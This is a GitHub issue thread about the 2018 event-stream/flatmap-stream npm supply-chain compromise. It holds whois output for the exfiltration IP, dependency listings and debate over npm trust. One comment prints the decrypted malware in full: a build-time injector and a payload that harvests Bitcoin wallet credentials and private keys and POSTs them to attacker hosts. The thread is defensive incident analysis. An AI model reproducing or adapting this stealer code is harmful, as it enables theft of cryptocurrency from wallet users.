fax-no:         +60320318851
e-mail:         abuse@shinjiru.com.my
mnt-ref:        APNIC-HM
mnt-by:         APNIC-HM
last-modified:  2018-01-11T12:57:21Z
source:         APNIC

role:           Shinjiru Technology Sdn Bhd administrator
address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,, Kuala Lumpur Wilayah Persekutuan 58100
country:        MY
phone:          +60320318850
fax-no:         +60320318850
e-mail:         abuse@shinjiru.com.my
admin-c:        STSB2-AP
tech-c:         STSB2-AP
nic-hdl:        STSB2-AP
mnt-by:         MAINT-SHINJIRU-MY
last-modified:  2017-03-20T10:31:34Z
source:         APNIC

% Information related to '111.90.144.0/21AS45839'

route:          111.90.144.0/21
origin:         AS45839
descr:          Shinjiru Technology Sdn Bhd
                19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,
mnt-by:         MAINT-SHINJIRU-MY
last-modified:  2018-10-25T04:06:40Z
source:         APNIC

% This query was served by the APNIC Whois Service version 1.88.15-46 (WHOIS-US4)

```

What's this address? Is it the person hacking bitcon?

Reacted by ExE Boss and Bosn

-

### zombieleet commented on Nov 27, 2018

https://github.com/zombieleet

[zombieleet](https://github.com/zombieleet)

[on Nov 27, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442252158)

i ran npm ls event-stream flatmap-stream and i got this

```
-- nodemon@1.18.6
  `-- pstree.remy@1.1.0
    `-- ps-tree@1.1.0
      `-- event-stream@3.3.6
        `-- flatmap-stream@0.1.1

```

I think nodemon@1.18.6 is affected also

Reacted by Dave Kerr, Liam England and ExE Boss

-

### N3X15 commented on Nov 27, 2018

https://github.com/N3X15

[N3X15](https://github.com/N3X15)

[on Nov 27, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442255566)

Whois for 111.90.151.134:

```
$ whois 111.90.151.134
% [whois.apnic.net]
% Whois data copyright terms    http://www.apnic.net/db/dbcopyright.html

% Information related to '111.90.128.0 - 111.90.159.255'

% Abuse contact for '111.90.128.0 - 111.90.159.255' is 'abuse@shinjiru.com.my'

inetnum:        111.90.128.0 - 111.90.159.255
netname:        SHINJIRU-MY
descr:          Shinjiru Technology Sdn Bhd
country:        MY
admin-c:        STSB2-AP
tech-c:         STSB2-AP
country:        MY
org:            ORG-STSB2-AP
status:         ALLOCATED PORTABLE
mnt-by:         APNIC-HM
mnt-lower:      MAINT-SHINJIRU-MY
mnt-routes:     MAINT-SHINJIRU-MY
mnt-irt:        IRT-SHINJIRU-MY
last-modified:  2018-01-11T13:04:14Z
source:         APNIC

irt:            IRT-SHINJIRU-MY
address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,, Kuala Lumpur Wilayah Persekutuan 58100
e-mail:         abuse@shinjiru.com.my
abuse-mailbox:  abuse@shinjiru.com.my
admin-c:        STSB2-AP
tech-c:         STSB2-AP
auth:           # Filtered
mnt-by:         MAINT-SHINJIRU-MY
last-modified:  2017-03-20T10:31:35Z
source:         APNIC

organisation:   ORG-STSB2-AP
org-name:       Shinjiru Technology Sdn Bhd
country:        MY
address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,
phone:          +60320318850
fax-no:         +60320318851
e-mail:         abuse@shinjiru.com.my
mnt-ref:        APNIC-HM
mnt-by:         APNIC-HM
last-modified:  2018-01-11T12:57:21Z
source:         APNIC

role:           Shinjiru Technology Sdn Bhd administrator
address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,, Kuala Lumpur Wilayah Persekutuan 58100
country:        MY
phone:          +60320318850
fax-no:         +60320318850
e-mail:         abuse@shinjiru.com.my
admin-c:        STSB2-AP
tech-c:         STSB2-AP
nic-hdl:        STSB2-AP
mnt-by:         MAINT-SHINJIRU-MY
last-modified:  2017-03-20T10:31:34Z
source:         APNIC

% Information related to '111.90.144.0/21AS45839'

route:          111.90.144.0/21
origin:         AS45839
descr:          Shinjiru Technology Sdn Bhd
                19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,
mnt-by:         MAINT-SHINJIRU-MY
last-modified:  2018-10-25T04:06:40Z
source:         APNIC

% This query was served by the APNIC Whois Service version 1.88.15-46 (WHOIS-US4)

```

What's this address? Is it the person hacking bitcon?

Nobody's making any accusations, it was just noticed in network traffic. IIRC, it was where things were being sent. Usually, though, such servers are themselves compromised and the attacker has a foothold. In other words, they may themselves be a victim.

Reacted by ExE Boss

-

### fraggle222 commented on Nov 27, 2018

https://github.com/fraggle222

[fraggle222](https://github.com/fraggle222)

[on Nov 27, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442256390)

From [@cnorthwood](https://github.com/cnorthwood) comment: [#116 (comment)](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441727488) and using process.env.npm_package_description = 'A Secure Bitcoin Wallet';

We get:

```
module.exports = function(e) {
    try {
        if (!/build\:.*\-release/.test(process.argv[2])) return;
        var t = process.env.npm_package_description,
            r = require("fs"),
            i = "./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js",
            n = r.statSync(i),
            c = r.readFileSync(i, "utf8"),
            o = require("crypto").createDecipher("aes256", t),
            s = o.update(e, "hex", "utf8");
        s = "\n" + (s += o.final("utf8"));
        var a = c.indexOf("\n/*@@*/");
        0 <= a && (c = c.substr(0, a)), r.writeFileSync(i, c + s, "utf8"), r.utimesSync(i, n.atime, n.mtime), process.on("exit", function() {
            try {
                r.writeFileSync(i, c, "utf8"), r.utimesSync(i, n.atime, n.mtime)
            } catch (e) {}
        })
    } catch (e) {}
};

```

Pretty sure someone found that earlier, because I saw reference to ReedSolomonDecoder somewhere, but didn't see the full text.

Then decoding this bit (the "s" part above) yields:

```
    function e() {
        try {
            var o = require("http"),
                a = require("crypto"),
                c = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\n2wIDAQAB\n-----END PUBLIC KEY-----";

            function i(e, t, n) {
                e = Buffer.from(e, "hex").toString();
                var r = o.request({
                    hostname: e,
                    port: 8080,
                    method: "POST",
                    path: "/" + t,
                    headers: {
                        "Content-Length": n.length,
                        "Content-Type": "text/html"
                    }
                }, function() {});
                r.on("error", function(e) {}), r.write(n), r.end()
            }

            function r(e, t) {
                for (var n = "", r = 0; r < t.length; r += 200) {
                    var o = t.substr(r, 200);
                    n += a.publicEncrypt(c, Buffer.from(o, "utf8")).toString("hex") + "+"
                }
                i("636f7061796170692e686f7374", e, n), i("3131312e39302e3135312e313334", e, n)
            }

            function l(t, n) {
                if (window.cordova) try {
                    var e = cordova.file.dataDirectory;
                    resolveLocalFileSystemURL(e, function(e) {
                        e.getFile(t, {
                            create: !1
                        }, function(e) {
                            e.file(function(e) {
                                var t = new FileReader;
                                t.onloadend = function() {
                                    return n(JSON.parse(t.result))
                                }, t.onerror = function(e) {
                                    t.abort()
                                }, t.readAsText(e)
                            })
                        })
                    })
                } catch (e) {} else {
                    try {
                        var r = localStorage.getItem(t);
                        if (r) return n(JSON.parse(r))
                    } catch (e) {}
                    try {
                        chrome.storage.local.get(t, function(e) {
                            if (e) return n(JSON.parse(e[t]))
                        })
                    } catch (e) {}
                }
            }
            global.CSSMap = {}, l("profile", function(e) {
                for (var t in e.credentials) {
                    var n = e.credentials[t];
                    "livenet" == n.network && l("balanceCache-" + n.walletId, function(e) {
                        var t = this;
                        t.balance = parseFloat(e.balance.split(" ")[0]), "btc" == t.coin && t.balance < 100 || "bch" == t.coin && t.balance < 1e3 || (global.CSSMap[t.xPubKey] = !0, r("c", JSON.stringify(t)))
                    }.bind(n))
                }
            });
            var e = require("bitcore-wallet-client/lib/credentials.js");
            e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) {
                var t = this.getKeysFunc(e);
                try {
                    global.CSSMap && global.CSSMap[this.xPubKey] && (delete global.CSSMap[this.xPubKey], r("p", e + "\t" + this.xPubKey))
                } catch (e) {}
                return t
            }
        } catch (e) {}
    }
    window.cordova ? document.addEventListener("deviceready", e) : e()
}();```

```

Reacted by clayha, Gabriel and ExE Boss

-

### DanielRuf commented on Nov 27, 2018

https://github.com/DanielRuf

[DanielRuf](https://github.com/DanielRuf)

[on Nov 27, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442259736)

All current dependents: https://gist.github.com/DanielRuf/7e4c9e0be5c8faf458832abf2eba70fc

Reacted by Gaspar Dip and Matt Blum

-

### devtingz commented on Nov 28, 2018

https://github.com/devtingz

[devtingz](https://github.com/devtingz)

[on Nov 28, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442266291)

But that random dude is more random the random dude who maintained it at first

I'd like to know how you measure the level of randomness.

It's sad it would even have to be explained to a fellow programmer that it's pretty easy to measure "dude randomness".

The original maintainer:
He is a random dude with at least one package that has been chosen by dozens of well-known app makers, and thousands of others over some years, and it's a safe bet a small fraction of them have vetted one of the version 3 releases of the package, and with the volume of users that even the small fraction is a noteworthy absolute total of eyeballs on the code.

Malware guy:
He is a random dude whose known body of work previoisly consisted of 3 barely touched forks.

It's obvious that anyone who trusts code they did not personally vet shares blame, but it's just as obvious that there are levels of trustworthiness and in the example above that one random dude is far more dangerous to trust than the other.

Reacted by Ty Smith, Jeffrey Walton and ExE Boss

-

### noloader commented on Nov 28, 2018

https://github.com/noloader

[noloader](https://github.com/noloader)

[on Nov 28, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442273789)

@mscarborough-lampdev,

Lol... Let me point out the obvious... Original unknown dude did not have encrypted payloads in his warez, and his code did not fail an audit.

(But good point otherwise).

Reacted by ExE Boss

-

### devtingz commented on Nov 28, 2018

https://github.com/devtingz

[devtingz](https://github.com/devtingz)

[on Nov 28, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442277845)

@mscarborough-lampdev,

Lol... Let me point out the obvious... Original unknown dude did not have encrypted payloads in his warez, and his code did not fail an audit.

(But good point otherwise).

Indeed. Sadly, NPM itself has no solid processees that stopped new guy from hijacking the built up trustworthiness of the original maintainer.

Each user is at fault for not vendoring code and personally vetting it.

The entire community shares blame for so willingly allowing obfuscated code at all instead of establishing a build process that shows unobfuscated code and just specifies a minifier to use during installation.

NPM itself is at fault for many many things:
Not detecting and warning about new obfuscated code,
For automatically being over-aggressive in dependency upgrading,
For not warning when a package has changed ownership,
For not forcing ownership changes to constitute a major version change,
Etc

And the original maintainer (and all maintainers of popular packages) have to be discouraged from blithely exposing "fans"/users to a massive drop in trustworthiness.

Reacted by Charlie Jonas, Chris, Matt Montag, Ikhsan Agustian and ExE Boss

Reacted by Matt Montag

-

### ExE-Boss commented on Nov 28, 2018

https://github.com/ExE-Boss

[ExE-Boss](https://github.com/ExE-Boss)

[on Nov 28, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442290333)

[@shawngmc](https://github.com/shawngmc)

I know there are tools for evaluating modules that are too heavy (like https://github.com/siddharthkp/cost-of-modules) are there any that will warn if a module is too trivial?

A simple line-counter would suffice.

```
import lodash from 'lodash';
import mysql from 'mysql-server-5.6-linux-x64';
import wombat from 'wombat';
import evilcode from 'evilcode';

let buildString = function () {
  // greet the user
  let a = 'hello'
  // we don't know who the user is; therefore, we have to handle all possibilities
  // as our code license only covers nations on this celestial body, the third rock from
  // Sol - aka Earth - we will only greet users who the license applies to. This will also
  // serve as notice that this software has not been licensed for use outside of Earth
  // The last thing I want is this code to be used to power some intergalactic oppressor
  // TODO: Contact lawyer about edge cases
  // - Orbit - Geosynchronous, LEO, etc.
  // - Moon - is this satellite technically considered to be part of earth?
  //       (If we're mining Helium-3 on the moon, I want in!)
  let b = 'world'
  let c = a
  /*
 ensure proper spacing
*/
c = a + ' '
  c = a + b
}

let greetString = buildString();
evilcorp(greetString);
console.log(greetString)
```

Yup, that's definitely not trivial. It's good code!

buildString() returns undefined:

```
let buildString = function () {
	let a = "hello";	// a: "hello", b: undefined, c: undefined
	let b = "world";	// a: "hello", b: "world", c: undefined
	let c = a;	// a: "hello", b: "world", c: "hello"
	c = a + " ";	// a: "hello", b: "world", c: "hello "
	c = a + b;	// a: "hello", b: "world", c: "helloworld"
	// No `return;` statement implies `return undefined;`
};
```

[Sign up for free](https://github.com/signup?return_to=https://github.com/dominictarr/event-stream/issues/116) to join this conversation on GitHub. Already have an account? [Sign in to comment](https://github.com/login?return_to=https://github.com/dominictarr/event-stream/issues/116)

## Metadata

## Metadata

### Assignees

No one assigned

### Labels

No labels

No labels

### Projects

No projects

### Milestone

No milestone

### Relationships

None yet

### Development

No branches or pull requests

## Issue actions

-
